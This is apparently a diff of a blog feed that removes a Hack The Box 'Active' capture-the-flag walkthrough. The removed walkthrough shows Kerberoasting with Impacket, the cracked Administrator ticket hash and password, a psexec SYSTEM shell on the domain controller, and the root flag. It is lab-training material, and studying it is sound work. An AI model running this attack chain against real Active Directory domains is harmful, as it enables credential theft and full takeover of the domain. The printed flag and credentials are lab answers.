-  bruteforce    Bruteforce username:password combos, from a file or stdin
-  bruteuser     Bruteforce a single user<span class="s1">'s password from a wordlist
-  help          Help about any command
-  passwordspray Test a single password against a list of users
-  userenum      Enumerate valid domain usernames via Kerberos
-  version       Display version info and quit
-
-Flags:
-      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
-      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
-  -d, --domain string   The full domain to use (e.g. contoso.com)
-  -h, --help            help for kerbrute
-  -o, --output string   File to write logs to. Optional.
-      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
-  -t, --threads int     Threads to use (default 10)
-  -v, --verbose         Log failures and errors
-
-Use "kerbrute [command] --help" for more information about a command.
-</span></code></pre></div></div>
-
-<ul>
-  <li>We can obtain a ticket for the administrator user.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
-<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
-active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938
-</code></pre></div></div>
-
-<ul>
-  <li>We have the admin user hash, let’s crack it.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span>
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
-<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
-active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938             
-
-
-
-<span class="o">[</span>-] CCache file is not found. Skipping...
-<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$4e5088992b25d09403d37d2e9ef6e72a$8c895d03044c58eb7c992d6c70f3ab24ae8c6716a2cdae892b7cbc67ba09818f3f5a04b8f0e37ffd45cc6455b2ac76ac7d50fc53df376ee22d951c44e997ab8ae4f139753e74d224d95c01d3fad9788e0a1a9413ad3782ae99921e681c6400e71a786082ec52549c445f7fbc352f12650a909f01f8d0f9a7e1da875ed9521df6643c80fb2454123e58caf3113ee8cae08b9ee296de7beccb621c3d3905908291faa105879c4f13b9c3e2598e3a4631c25a6d302a6a4b07f6de66d2cfba70cdba9b194889283cde2ee9dae39b9f22c94e07e3aca3f155c37b08278c02a32b75b96cbc3abf08f86a65b22f08c56d17e86faf42ecaf06a17f8f30c34ccdac2fafe6956f852cb07a6aa8297bd34d491b2c94f3180d68d3b0753a69e6a9e3be6f4afd99f6119c4c594456bbe92ca29796ce6b3b5ce23ed6c6718411301dc2feb0ab6f43059cdc09149f22c2ccc183554dc527329a6ecc3fa3024da5b95cbf9df28c6cd02221c99719446f6a78d56a9424eb642221d57df9cea4ddd251a576a1bc352d5ef78a617cd9e26d7fcaec60839a21555be11429568f5e6c1baa5eb8a7ad3cec87d51e0ac3485e8b721377b2f3e12a52e953fb27d4b94b6a5c73452d6ae6b0b5d4d8730114a5aff717f386663eb10d39451097ea081f42595fa0dd1e2aefe2bf08e5884f5615ede70728c6c1bb33fbb39e4bcfba746bf760f16f14ef60162b83c7f835a46fb61b9e73ed119e46ae1753e9c11414d4f20fef2527e2ca6fa95889c1f4d6ff3de678455db626f0dead28d9d0cdf566074e3fd03378283bcb3a0148f997f2f63c53113d700ef7c6d2613d62a16ecd4145aec9eb40a948f1b98c161657b2a114e550e3ee277906f8458d160b2ea3fbdf17eff96b2ca126f7850feaa0885d4f1518a43478ded45b70f40bae58349147681457d22b4cd5aeaaf32632df697914ec300daec74c8d9dbbcc25581c9b2c795598b1a9a34a17a6f8f835413fbd6ca1173935ccd4242c4fa7cf9e90630646cff5ab81cadb0d63259cb471e0e296a96b6461c120efcdfa22e93654cbe537f1b98be8b27c046343263b7335434b8bfb852e8ea1cf760945df81b1701632f8fa2c1da5721cf17e159dd03aa9b55d8a605fb907a341e361280950fa58a1015e4bb5668721cd2259a69dcbd7ab3c0bfcf92cab7a81f85f5bb67125f046ec6bc63d30741cde6792e165ecae26c8eb8ae29ee490b3b0100c98282b6c90ad39ed7783607916c344406667</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
-</span>Using default input encoding: UTF-8
-Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
-Will run 2 OpenMP threads
-Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
-Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
-1g 0:00:00:26 DONE <span class="o">(</span>2023-01-28 18:58<span class="o">)</span> 0.03752g/s 395402p/s 395402c/s 395402C/s Tiffani1432..Tiago_18
-Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
-Session completed
-</code></pre></div></div>
-
-<ul>
-  <li>The password is correct.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Now we can have a shell.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.100.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file AteihbIx.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.100.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service nMsa on 10.10.10.100.....
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service nMsa.....
-<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
-Microsoft Windows <span class="o">[</span>Version 6.1.7601]
-Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">hostname
-</span>DC
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</code></pre></div></div>
-
-<h2 id="root-flag">Root flag</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
-385fab9ee1161ce755cbbffe84ed6701
-
-C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry></feed>
